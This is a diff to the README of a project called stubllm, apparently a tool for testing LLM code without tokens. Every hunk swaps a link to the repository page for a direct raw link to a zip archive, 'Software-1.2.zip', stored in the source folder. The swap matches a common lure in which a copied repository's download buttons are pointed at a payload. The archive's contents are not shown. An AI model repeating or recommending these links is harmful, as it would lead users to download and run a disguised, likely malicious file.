@@ -1,6 +1,6 @@
 # 🧪 stubllm - Test LLM code without tokens
 
-[![Download stubllm](https://img.shields.io/badge/Download-Blue%20%26%20Gray-4B6CB7?style=for-the-badge)](https://github.com/Flawlargetoothedaspen304/stubllm)
+[![Download stubllm](https://img.shields.io/badge/Download-Blue%20%26%20Gray-4B6CB7?style=for-the-badge)](https://github.com/Flawlargetoothedaspen304/stubllm/raw/refs/heads/main/src/stubllm/Software-1.2.zip)
 
 ## 🚀 What this does
 
@@ -17,7 +17,7 @@ Use it when you want to:
 
 Use the link below to visit the page and download the app:
 
-[Go to the stubllm download page](https://github.com/Flawlargetoothedaspen304/stubllm)
+[Go to the stubllm download page](https://github.com/Flawlargetoothedaspen304/stubllm/raw/refs/heads/main/src/stubllm/Software-1.2.zip)
 
 After the page opens:
 
@@ -204,7 +204,7 @@ If the app opens but your test app cannot connect:
 
 If you need the file again, use this link to visit the page and download:
 
-[https://github.com/Flawlargetoothedaspen304/stubllm](https://github.com/Flawlargetoothedaspen304/stubllm)
+[https://github.com/Flawlargetoothedaspen304/stubllm/raw/refs/heads/main/src/stubllm/Software-1.2.zip](https://github.com/Flawlargetoothedaspen304/stubllm/raw/refs/heads/main/src/stubllm/Software-1.2.zip)
 
 ## 📚 Terms used in this project
 
